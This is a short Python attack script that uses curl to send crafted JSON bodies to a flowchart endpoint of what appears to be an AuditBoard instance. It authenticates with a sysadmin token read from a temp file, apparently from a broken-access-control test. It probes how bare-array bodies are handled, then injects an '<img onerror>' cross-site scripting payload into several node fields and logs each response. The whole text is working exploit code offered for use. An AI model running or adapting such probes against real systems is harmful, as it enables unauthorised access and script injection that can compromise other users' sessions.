import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def req(body):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/documents/flowchart',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXF'+uuid.uuid4().hex[:5]
print("=== body as bare array ===")
for body in [[], [{"id":"1","label":f"ZX{tag}"}]]:
    c,b=req(body)
    print(f"  {json.dumps(body)[:60]:62} -> {c} {b[:250].replace(chr(10),' ')}")
print()
print("=== payload in node fields ===")
pay=f'<img src=x onerror=alert(document.domain)>{tag}'
for node in [{"id":"1","label":pay},{"id":"1","text":pay},{"id":"1","name":pay},{"label":pay}]:
    c,b=req([node])
    print(f"  {list(node.keys())} -> {c} {b[:250].replace(chr(10),' ')}")
